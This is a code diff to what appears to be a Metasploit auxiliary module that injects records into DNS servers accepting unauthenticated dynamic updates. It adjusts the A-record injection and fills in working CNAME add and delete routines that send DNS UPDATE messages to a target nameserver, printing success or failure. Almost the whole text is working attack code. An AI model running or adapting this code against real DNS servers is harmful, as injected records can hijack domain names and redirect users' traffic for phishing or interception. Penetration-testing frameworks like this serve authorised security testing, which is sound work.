@@ -55,7 +55,7 @@ class MetasploitModule < Msf::Auxiliary
         # Prerequisite is that no A records exist for the name.
         update.absent("#{datastore['INJECTDOMAIN']}.", 'A')
         # Add two A records for the name.
-        update.add("#{datastore['INJECTDOMAIN']}.", 'A', 86400, datastore['INJECTIP'])
+        update.add("#{datastore['INJECTDOMAIN']}.", Dnsruby::Types.A , 86400, datastore['INJECTIP'])
         begin
           resolver.send_message(update)
           print_good("The record '#{datastore['INJECTDOMAIN']} => #{datastore['INJECTIP']}' has been added!")
@@ -77,9 +77,29 @@ class MetasploitModule < Msf::Auxiliary
   end
   #
   def cname_record(action)
+    resolver = Dnsruby::Resolver.new({:nameserver => datastore['NS']})
+    update   = Dnsruby::Update.new(datastore['DOMAIN'])
     case
       when action == 'ADD'
+        update.absent(datastore['INJECTDOMAIN'])
+        update.add(datastore['INJECTDOMAIN'], Dnsruby::Types.CNAME, 86400, datastore['DOMAIN'])
+        begin
+          resolver.send_message(update)
+          print_good("The record '#{datastore['INJECTDOMAIN']} => #{datastore['DOMAIN']}' has been added!")
+        rescue Dnsruby::YXDomain => e
+          print_error("Can't inject #{datastore['INJECTDOMAIN']}. Make sure the DNS server is vulnerable or domain already exists.")
+          vprint_error("Update failed: #{e}")
+        end
       when action == 'DEL'
+        begin
+          update.present(datastore['INJECTDOMAIN'], 'CNAME')
+          update.delete(datastore['INJECTDOMAIN'],  'CNAME')
+          resolver.send_message(update)
+          print_good("The record '#{datastore['INJECTDOMAIN']} => #{datastore['DOMAIN']}' has been deleted!")
+        rescue Exception => e
+          print_error("Can't delete #{datastore['INJECTDOMAIN']}. DNS server is vulnerable or domain doesn't exist.")
+          vprint_error "Update failed: #{e}"
+        end
     end
   end
 
@@ -147,7 +167,6 @@ class MetasploitModule < Msf::Auxiliary
       a_record(action.name)
     when datastore['TYPE'] == 'CNAME'
       cname_record(action.name)
-      print_warning("Not implemented yet.")
     when datastore['TYPE'] == 'TXT'
       txt_record(action.name)
     when datastore['TYPE'] == 'MX'
